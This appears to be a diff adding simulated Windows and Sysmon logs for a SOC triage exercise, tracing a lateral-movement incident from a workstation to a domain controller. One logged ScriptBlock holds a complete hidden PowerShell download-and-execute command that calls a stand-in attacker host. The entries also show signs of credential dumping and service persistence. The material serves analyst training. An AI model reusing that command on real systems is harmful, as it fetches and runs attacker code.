@@ -1,6 +1,63 @@
-RAW SIEM LOGS
--------------
-Windows Security, Sysmon, and network telemetry
-used for SOC triage simulation.
+2025-02-14T03:11:42Z HOST=WS-21 EVENTID=4624
+Account=a.chen LogonType=2 AuthenticationPackage=Negotiate
 
-Add raw logs for Incident 01 lateral movement
+2025-02-14T03:12:03Z HOST=WS-21 EVENTID=4688
+NewProcessName=C:\Windows\System32\cmd.exe
+CreatorProcess=explorer.exe User=a.chen
+
+2025-02-14T03:12:19Z HOST=WS-21 EVENTID=4625
+Account=helpdesk.admin LogonType=3 Status=0xC000006A SourceIP=10.0.5.21
+
+2025-02-14T03:12:41Z HOST=WS-21 EVENTID=4104
+ScriptBlockText=powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.14/a.ps1')"
+
+2025-02-14T03:12:44Z HOST=WS-21 SYSMON_EVENT=3
+Image=powershell.exe DestinationIP=203.0.113.14 DestinationPort=443 Protocol=TCP
+
+2025-02-14T03:12:48Z HOST=WS-21 SYSMON_EVENT=11
+Image=powershell.exe TargetFilename=C:\Users\Public\agent.exe Hash=SHA256:9fd3c8...
+
+2025-02-14T03:12:53Z HOST=WS-21 EVENTID=7045
+ServiceName=AgentUpdate
+ServiceFile=C:\Users\Public\agent.exe
+StartType=Auto Account=LocalSystem
+
+2025-02-14T03:13:01Z HOST=WS-21 EVENTID=4672
+Account=a.chen Privileges=SeDebugPrivilege,SeBackupPrivilege
+
+2025-02-14T03:13:09Z HOST=WS-21 SYSMON_EVENT=3
+Image=agent.exe DestinationIP=203.0.113.15 DestinationPort=80
+
+2025-02-14T03:13:22Z HOST=WS-21 EVENTID=4656
+ObjectName=LSA AccessMask=0x1010 ProcessName=agent.exe
+
+2025-02-14T03:13:24Z HOST=WS-21 EVENTID=4663
+ObjectName=LSA AccessMask=0x1010 ProcessName=agent.exe Status=SUCCESS
+
+2025-02-14T03:13:37Z HOST=WS-21 EVENTID=4624
+Account=helpdesk.admin LogonType=3 AuthenticationPackage=NTLM SourceIP=10.0.5.21
+
+2025-02-14T03:13:55Z HOST=WS-22 EVENTID=5145
+ShareName=\\WS-22\C$ Account=helpdesk.admin AccessMask=0x2
+
+2025-02-14T03:14:08Z HOST=WS-22 EVENTID=4688
+NewProcessName=C:\ProgramData\wua.exe ParentProcess=services.exe
+
+2025-02-14T03:14:12Z HOST=WS-22 EVENTID=7045
+ServiceName=WinAgent ServiceFile=C:\ProgramData\wua.exe
+
+2025-02-14T03:14:21Z HOST=WS-22 SYSMON_EVENT=3
+Image=wua.exe DestinationIP=203.0.113.16 DestinationPort=443
+
+2025-02-14T03:14:39Z HOST=DC-01 EVENTID=4624
+Account=helpdesk.admin LogonType=3 AuthenticationPackage=NTLM SourceIP=10.0.5.22
+
+2025-02-14T03:14:47Z HOST=DC-01 EVENTID=4769
+ServiceName=krbtgt TicketEncryptionType=RC4-HMAC
+
+2025-02-14T03:14:52Z HOST=DC-01 EVENTID=4672
+Account=helpdesk.admin Privileges=SeDebugPrivilege
+
+2025-02-14T03:15:01Z HOST=DC-01 SYSMON_EVENT=3
+Image=lsass.exe DestinationIP=203.0.113.17 DestinationPort=443
+
